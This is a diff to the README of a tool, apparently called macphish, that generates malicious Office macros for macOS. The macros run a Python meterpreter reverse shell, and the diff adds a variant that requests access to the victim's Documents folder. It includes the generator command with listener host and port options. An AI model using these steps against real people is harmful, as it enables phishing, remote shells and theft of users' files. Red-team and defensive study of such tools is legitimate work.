@@ -25,9 +25,9 @@ To generate a macro that will execute a Python meterpreter payload (Note that on
 
     $./macphish.py -a meterpreter -lh <host> -lp <port> -p <payload type> -m
 
-## meterpreter-grant (Office 2016)
+## meterpreter-grant (Office 2011/Office 2016)
 
-This payload executes a Python meterpreter.
+This payload executes a Python meterpreter after calling GrantAccessToMultipleFiles(/Users/<user>/Documents). The meterpreter shell will have access to user documents if permissions are granted. Additionally, the document must be run from anywhere (including subfolders) inside the Documents folder.
 
 To generate a macro that will execute a Python meterpreter payload (Note that only Python payloads will work):
 
